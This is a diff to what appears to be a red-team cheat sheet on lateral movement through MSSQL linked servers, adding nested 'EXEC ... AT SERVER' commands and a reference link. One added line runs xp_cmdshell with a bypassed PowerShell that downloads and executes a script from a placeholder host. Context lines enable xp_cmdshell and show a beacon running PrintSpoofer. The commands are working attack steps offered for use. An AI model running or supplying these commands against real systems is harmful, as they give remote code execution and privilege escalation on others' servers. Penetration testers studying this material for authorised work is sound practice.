@@ -1269,6 +1269,10 @@ SELECT * FROM OPENQUERY("sql02.vault.io", 'select * from sys.configurations wher
 # Enable xp_cmdshell **via** openquery
 SELECT 1 FROM openquery("dc01", 'select 1; EXEC sp_configure ''show advanced options'', 1; reconfigure')
 
+# This can also be nested (potentially coming back to the own server with different permissions)
+EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT SERVER1') AT SERVER2
+EXEC ('EXEC (''xp_cmdshell ''''powershell.exe -exec bypass -c "iex(iwr http://<ip>/run.txt -usebasicparsing)"'''';'') AT SERVER1') AT SERVER2
+
 SELECT 1 FROM openquery("dc01", 'select 1; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure')
 
 # scripted web delivery
@@ -1302,6 +1306,7 @@ beacon> shell PrintSpoofer.exe -c "powershell -enc [...]"
 - [Database Links Cheat Sheet](https://github.com/SofianeHamlaoui/Pentest-Notes/blob/master/Security_cheatsheets/databases/sqlserver/5-lateral-movement.md)
 - [MSSQL - OSEP Code Snippets](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/MSSQL/Program.cs)
 - [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
+- [XCT MSSQL Notes](https://notes.vulndev.io/notes/redteam/payloads/windows/mssql)
 
 ## Full Control
 
